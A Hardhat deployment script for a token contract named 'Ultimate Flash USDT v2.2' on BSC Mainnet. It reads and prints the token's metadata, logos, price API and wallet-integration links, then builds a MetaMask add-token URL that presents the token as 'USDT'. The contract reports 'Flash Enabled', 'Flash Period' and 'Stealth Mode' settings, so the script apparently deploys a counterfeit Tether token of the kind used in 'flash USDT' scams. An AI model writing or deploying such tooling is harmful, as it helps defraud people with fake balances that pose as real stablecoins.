const { ethers } = require("hardhat");

async function main() {
    console.log("🚀 Deploying Ultimate Flash USDT v2.2 - Enhanced Netlify Integration");
    console.log("=" .repeat(70));
    
    // Get deployer account
    const [deployer] = await ethers.getSigners();
    console.log("👤 Deploying with account:", deployer.address);
    
    // Check balance
    const balance = await ethers.provider.getBalance(deployer.address);
    console.log("💰 Account balance:", ethers.formatEther(balance), "BNB");
    
    if (parseFloat(ethers.formatEther(balance)) < 0.01) {
        console.log("⚠️ Warning: Low balance! Make sure you have enough BNB for deployment.");
    }
    
    try {
        // Deploy contract
        console.log("\n📦 Deploying contract...");
        const UltimateFlashUSDT = await ethers.getContractFactory("UltimateFlashUSDTFixed");
        const contract = await UltimateFlashUSDT.deploy();
        
        console.log("⏳ Waiting for deployment...");
        await contract.waitForDeployment();
        
        const contractAddress = await contract.getAddress();
        console.log("✅ Contract deployed to:", contractAddress);
        
        // Wait for a few confirmations
        console.log("⏳ Waiting for confirmations...");
        await new Promise(resolve => setTimeout(resolve, 10000));
        
        // Test basic functions
        console.log("\n🧪 Testing basic functions...");
        const name = await contract.name();
        const symbol = await contract.symbol();
        const decimals = await contract.decimals();
        const totalSupply = await contract.totalSupply();
        
        console.log("📋 Basic Info:");
        console.log("   Name:", name);
        console.log("   Symbol:", symbol);
        console.log("   Decimals:", decimals);
        console.log("   Total Supply:", ethers.formatUnits(totalSupply, decimals));
        
        // Test enhanced metadata functions
        console.log("\n🔐 Enhanced Metadata v2.2:");
        const completeMetadata = await contract.getCompleteMetadata();
        console.log("   Name:", completeMetadata[0]);
        console.log("   Symbol:", completeMetadata[1]);
        console.log("   Decimals:", completeMetadata[2]);
        console.log("   Total Supply:", ethers.formatUnits(completeMetadata[3], completeMetadata[2]));
        console.log("   Logo URLs Count:", completeMetadata[4].length);
        console.log("   Price USD:", ethers.formatUnits(completeMetadata[5], 6));
        console.log("   Price API:", completeMetadata[6]);
        console.log("   Token List URL:", completeMetadata[7]);
        console.log("   Mobile Add URL:", completeMetadata[8]);
        console.log("   Version:", completeMetadata[9]);
        
        // Test URL functions
        console.log("\n🔗 URL Functions:");
        const priceAPI = await contract.getPriceAPI();
        const tokenListURL = await contract.getTokenListURL();
        const mobileAddURL = await contract.getMobileAddURL();
        
        console.log("   Price API:", priceAPI);
        console.log("   Token List:", tokenListURL);
        console.log("   Mobile Add:", mobileAddURL);
        
        // Test logo functions
        console.log("\n🎨 Logo Functions:");
        const bestLogo = await contract.getBestLogo();
        const allLogos = await contract.getAllLogos();
        
        console.log("   Best Logo:", bestLogo);
        console.log("   Total Logos:", allLogos.length);
        allLogos.forEach((logo, index) => {
            console.log(`   Logo ${index + 1}:`, logo);
        });
        
        // Test system info
        console.log("\n⚙️ System Info:");
        const systemInfo = await contract.getSystemInfo();
        console.log("   Version:", systemInfo[0]);
        console.log("   Flash Enabled:", systemInfo[1]);
        console.log("   Flash Period:", systemInfo[2], "seconds");
        console.log("   Stealth Mode:", systemInfo[3]);
        console.log("   Total VIPs:", systemInfo[4]);
        
        // Test Trust Wallet data
        console.log("\n📱 Trust Wallet Data:");
        const trustWalletData = await contract.getTrustWalletData();
        console.log("   Contract Name:", trustWalletData[0]);
        console.log("   Contract Symbol:", trustWalletData[1]);
        console.log("   Official Logo:", trustWalletData[2]);
        console.log("   Contract Decimals:", trustWalletData[3]);
        console.log("   Explorer URL:", trustWalletData[4]);
        
        // Calculate deployment cost
        const deploymentTx = contract.deploymentTransaction();
        if (deploymentTx) {
            const receipt = await deploymentTx.wait();
            const gasUsed = receipt.gasUsed;
            const gasPrice = deploymentTx.gasPrice;
            const cost = gasUsed * gasPrice;
            
            console.log("\n💸 Deployment Cost:");
            console.log("   Gas Used:", gasUsed.toString());
            console.log("   Gas Price:", ethers.formatUnits(gasPrice, "gwei"), "gwei");
            console.log("   Total Cost:", ethers.formatEther(cost), "BNB");
        }
        
        // Generate integration info
        const integrationInfo = {
            contractAddress: contractAddress,
            network: "BSC Mainnet",
            chainId: 56,
            name: name,
            symbol: symbol,
            decimals: Number(decimals),
            totalSupply: ethers.formatUnits(totalSupply, decimals),
            version: completeMetadata[9],
            
            // URLs
            priceAPI: priceAPI,
            tokenListURL: tokenListURL,
            mobileAddURL: mobileAddURL,
            
            // Logos
            bestLogo: bestLogo,
            allLogos: allLogos,
            
            // MetaMask Integration
            metamaskURL: `https://metamask.app/token/add?address=${contractAddress}&symbol=USDT&decimals=6&image=${encodeURIComponent(bestLogo)}`,
            
            // BSCScan
            explorerURL: `https://bscscan.com/address/${contractAddress}`,
            
            // Features
            features: {
                flashEnabled: systemInfo[1],
                flashPeriod: Number(systemInfo[2]),
                stealthMode: systemInfo[3],
                logoCount: allLogos.length,
                enhancedMetadata: true,
                netlifyIntegration: true
            }
        };
        
        console.log("\n🎯 Integration Summary:");
        console.log("=" .repeat(50));
        console.log("📋 Contract Address:", contractAddress);
        console.log("🌐 Network: BSC Mainnet");
        console.log("🔗 Explorer:", integrationInfo.explorerURL);
        console.log("📱 Mobile Add:", mobileAddURL);
        console.log("📋 Token List:", tokenListURL);
        console.log("💲 Price API:", priceAPI);
        console.log("🎨 Logo Count:", allLogos.length);
        console.log("⚡ Version:", completeMetadata[9]);
        
        console.log("\n🔗 Quick Links:");
        console.log("📱 MetaMask Add:", integrationInfo.metamaskURL);
        console.log("🔍 BSCScan:", integrationInfo.explorerURL);
        
        console.log("\n✅ Deployment completed successfully!");
        console.log("🎉 Ultimate Flash USDT v2.2 is ready!");
        
        // Save deployment info
        const fs = require('fs');
        fs.writeFileSync(
            'enhanced-deployment-v2.2.json',
            JSON.stringify(integrationInfo, null, 2)
        );
        console.log("💾 Deployment info saved to enhanced-deployment-v2.2.json");
        
        return {
            success: true,
            contractAddress: contractAddress,
            integrationInfo: integrationInfo
        };
        
    } catch (error) {
        console.error("💥 Deployment failed:", error);
        return {
            success: false,
            error: error.message
        };
    }
}

// Execute deployment
if (require.main === module) {
    main()
        .then((result) => {
            if (result.success) {
                console.log("\n🎊 SUCCESS! Contract deployed and tested!");
                process.exit(0);
            } else {
                console.log("\n💥 FAILED! Check the error above.");
                process.exit(1);
            }
        })
        .catch((error) => {
            console.error("💥 Unexpected error:", error);
            process.exit(1);
        });
}

module.exports = main;
